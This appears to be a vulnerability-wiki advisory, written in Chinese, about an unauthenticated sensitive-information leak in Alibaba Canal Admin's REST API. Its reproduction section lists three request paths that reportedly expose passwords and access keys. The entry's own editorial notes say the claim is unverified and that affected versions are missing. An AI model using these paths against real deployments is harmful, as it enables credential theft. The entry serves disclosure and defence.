---
source: "wy876 漏洞文库"
title: "Canal存在敏感信息泄露漏洞"
product: "Alibaba Canal Admin REST"
record_type: "advisory"
review_status: "text-reviewed"
verification_status: "not-reproduced"
content_status: "needs-review"
identifier_status: "unknown"
primary_identifiers: ""
referenced_identifiers: ""
identifier_role: "unknown"
prerequisites: "相关admin API网络可达且鉴权缺失/关闭，配置中确有敏感字段"
source_status: "unknown"
side_effects: "原文未完整记录副作用、清理步骤或运行验证；阅读样例不等于获准在真实系统执行。"
id: "vw-0d82398b0646ab2809bf2330"
entity_id: "ve-0d82398b0646ab2809bf2330"
schema_version: "1"
---

# Canal存在敏感信息泄露漏洞

<!-- vulwiki-editorial:start -->
## 校订与适用边界

- 适用前提：相关admin API网络可达且鉴权缺失/关闭，配置中确有敏感字段
- 证据范围：仅三个路径没有HTTP响应/代码/截图，账号密码泄露是作者声明未证

### 尚未解决的证据缺口

以下限制仍适用于后文历史材料；相关版本、结果或修复结论不能据此视为已验证：

- 影响版本空白、鉴权部署条件/修复均缺
- 产品应明确Canal Admin而非所有Canal Server
- 需要脱敏响应或源码证明与可复现环境

本页为文本校订，未执行代码、PoC 或目标请求；原图仅保留引用，未据此确认复现成功。
<!-- vulwiki-editorial:end -->

## 技术正文与历史材料

### 一、漏洞描述
由于/api/v1/canal/config 未进行权限验证可直接访问，导致账户密码、accessKey、secretKey等一系列敏感信息泄露

### 二、影响版本


### 三、漏洞复现
```plain
/api/v1/canal/config/1/0
```

```plain
/api/v1/canal/config/0/9
```

```plain
/api/v1/canal/instance/1
```


> 原文: <https://www.yuque.com/xiaokp7/ocvun2/ulgmpe74leezg156>


---

> 来源：wy876 漏洞文库（https://github.com/wy876/POC (备份镜像 DMW11525708/wiki)）
